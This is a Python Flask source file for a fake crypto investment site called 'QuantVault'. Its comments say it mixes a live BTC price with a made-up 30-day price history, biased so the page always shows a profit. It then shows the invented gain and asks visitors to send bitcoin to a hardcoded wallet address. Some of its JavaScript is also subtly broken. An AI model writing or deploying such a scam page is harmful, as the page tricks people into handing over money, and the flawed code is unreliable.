import datetime
import random
import requests
from flask import Flask, render_template_string, jsonify

app = Flask(__name__)

# YOUR WALLET ADDRESS
WALLET_ADDRESS = "bc1qlmclf05eq4fp870259t4qld7d5frugjhwa02ee"

# Configuration
HYPOTHETICAL_ENTRY_USD = 1000  # We simulate a $1,000 investment entry

def get_live_btc_price():
    """Fetches real BTC price to make the graph look authentic."""
    try:
        response = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd")
        data = response.json()
        return data['bitcoin']['usd']
    except:
        return 65000 # Fallback price

def generate_simulated_history(current_price):
    """Generates a fake but realistic-looking history for the last 30 days."""
    data = []
    # We start with a price that is 15-25% lower than current to ensure "Profit"
    base_price = current_price * random.uniform(0.75, 0.85) 
    
    for i in range(30):
        # Random daily volatility
        change = random.uniform(-0.08, 0.12) # -8% to +12% swing
        base_price = base_price * (1 + change)
        
        data.append({
            "date": (datetime.datetime.now() - datetime.timedelta(days=30-i)).strftime("%m/%d"),
            "price": round(base_price, 2)
        })
    return data

@app.route("/")
def index():
    current_price = get_live_btc_price()
    history = generate_simulated_history(current_price)
    
    # Calculate "Projected" value: If they invested $1,000 worth of BTC 30 days ago
    # We calculate how much BTC that would have been, and what that BTC is worth now
    
    # 1. How much BTC did they "buy" 30 days ago?
    start_price_btc = history[0]['price']
    btc_amount = HYPOTHETICAL_ENTRY_USD / start_price_btc
    
    # 2. What is that BTC worth now?
    current_value = btc_amount * history[-1]['price']
    
    profit = current_value - HYPOTHETICAL_ENTRY_USD
    percent_gain = (profit / HYPOTHETICAL_ENTRY_USD) * 100
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>QuantVault | Institutional Yield</title>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
        <style>
            body { background: #050505; color: #e0e0e0; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
            .top-bar { background: #000; padding: 20px; display: flex; justify-content: space-between; border-bottom: 1px solid #333; }
            .logo { font-size: 28px; font-weight: 900; color: #fff; letter-spacing: 1px; }
            .logo span { color: #00ff88; }
            .status { color: #888; font-size: 12px; font-weight: 700; }
            .container { max-width: 1100px; margin: 40px auto; padding: 20px; }
            .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-bottom: 30px; }
            .card { background: #111; border: 1px solid #333; border-radius: 8px; padding: 25px; position: relative; overflow: hidden; }
            .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, #00ff88, #00b8ff); }
            .card h3 { margin-top: 0; color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
            .big-number { font-size: 36px; color: #fff; font-weight: 900; margin: 10px 0; letter-spacing: -1px; }
            .profit { color: #00ff88; font-size: 18px; font-weight: 700; }
            .address-box { background: #0a0a0a; padding: 15px; border: 1px solid #333; font-size: 13px; word-break: break-all; margin-top: 15px; color: #aaa; font-family: monospace; }
            .btn { background: #00ff88; color: #000; border: none; padding: 14px 24px; font-weight: 800; cursor: pointer; width: 100%; margin-top: 15px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; }
            .btn:hover { background: #fff; box-shadow: 0 0 15px rgba(0,255,136,0.4); }
            .fine-print { margin-top: 40px; font-size: 11px; color: #555; text-align: center; border-top: 1px solid #222; padding-top: 20px; }
            canvas { background: #0a0a0a; border: 1px solid #222; border-radius: 8px; padding: 10px; }
            .pulse { animation: pulse 2s infinite; }
            @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        </style>
    </head>
    <body>
        <div class="top-bar">
            <div class="logo">QUANT<span>VAULT</span></div>
            <div class="status">LIVE FEED :: BTC: ${{ price }}</div>
        </div>

        <div class="container">
            <div class="grid">
                <div class="card">
                    <h3>Simulated Entry (30d)</h3>
                    <div class="big-number">${{ entry }}</div>
                    <p style="font-size: 12px; color: #666;">Hypothetical Portfolio</p>
                </div>
                <div class="card">
                    <h3>Current Value</h3>
                    <div class="big-number">${{ current_val|round(0)|int }}</div>
                    <p class="profit">+{{ profit|round(0)|int }} ({{ percent_gain|round(1) }}%)</p>
                </div>
                <div class="card">
                    <h3>Market Beta</h3>
                    <div class="big-number" style="font-size: 24px; color: #00b8ff;">AGGRESSIVE</div>
                    <p style="font-size: 12px; color: #666;">High Volatility Strategy</p>
                </div>
            </div>

            <div class="card">
                <h3>Yield Chart (Simulated Market Beta)</h3>
                <canvas id="chart" height="200"></canvas>
            </div>

            <div class="card" style="margin-top: 20px;">
                <h3>Investment Wallet</h3>
                <p style="color: #aaa;">Send BTC to the address below to "lock in" your position.</p>
                <div class="address-box">{{ wallet }}</div>
                <button class="btn" onclick="copyAddr()">COPY & SEND</button>
            </div>
        </div>

        <div class="fine-print">
            <strong>INSTITUTIONAL DISCLOSURE:</strong> Funds are held in cold storage reserve. 
            The yield shown is based on a "Market Beta" simulation relative to BTC/USD volatility. 
            This is not a guaranteed return product. Your contribution supports the QuantVault Protocol.
        </div>

        <script>
            function copyAddr() {
                navigator.clipboard.writeText("{{ wallet }}");
                alert("Address copied. Send BTC to initialize your simulation.");
            }

            const ctx = document.getElementById('chart').getContext('2d');
            const prices = [{{ history | map(attribute='price') | list | join(',') }}];
            const dates = [{{ history | map(attribute='date') | list | join(',') }}];

            new Chart(ctx, {
                type: 'line',
                data: {
                    labels: dates,
                    datasets: [{
                        label: 'BTC/USD',
                        data: prices,
                        borderColor: '#00ff88',
                        backgroundColor: 'rgba(0, 255, 136, 0.1)',
                        fill: true,
                        tension: 0.4,
                        pointRadius: 0,
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    plugins: { legend: { display: false } },
                    scales: {
                        x: { display: false },
                        y: { ticks: { color: '#444' }, grid: { color: #1a1a1a } }
                    }
                }
            });
        </script>
    </body>
    </html>
    """, price=round(current_price, 2), entry=HYPOTHETICAL_ENTRY_USD, current_val=current_value, profit=profit, percent_gain=percent_gain, wallet=WALLET_ADDRESS, history=history)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
